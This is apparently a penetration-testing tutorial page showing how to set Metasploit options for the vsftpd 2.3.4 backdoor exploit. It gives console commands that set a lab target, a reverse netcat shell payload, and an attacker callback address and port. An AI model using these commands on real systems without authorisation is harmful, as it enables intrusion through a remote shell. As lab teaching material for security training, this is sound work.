Configuring Exploit Options

Defining target and payload parameters for a successful attack.

Essential Parameters
  • RHOSTS: Target IP address.
  • PAYLOAD: Malicious code to execute.
  • LHOST: Attacker's IP for callback.
  • LPORT: Attacker's port for callback.
Key Takeaway

Accurate configuration of `RHOSTS`, `PAYLOAD`, `LHOST`, and `LPORT` is critical for establishing a successful connection and executing the exploit.

Metasploit Console: Setting Options

# Set the target IP address
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
RHOSTS => 192.168.56.102

# Set the payload for a reverse shell
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/reverse_netcat
PAYLOAD => cmd/unix/reverse_netcat

# Set your Kali machine's IP for the callback
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.56.101
LHOST => 192.168.56.101

# Set the listening port for the callback
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444
LPORT => 4444

# Review all set options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
... (output showing configured options) ...
Common Mistake

Failing to ensure `LHOST` and `LPORT` are accessible from the target due to firewalls or incorrect IP addresses can prevent the payload's callback connection.
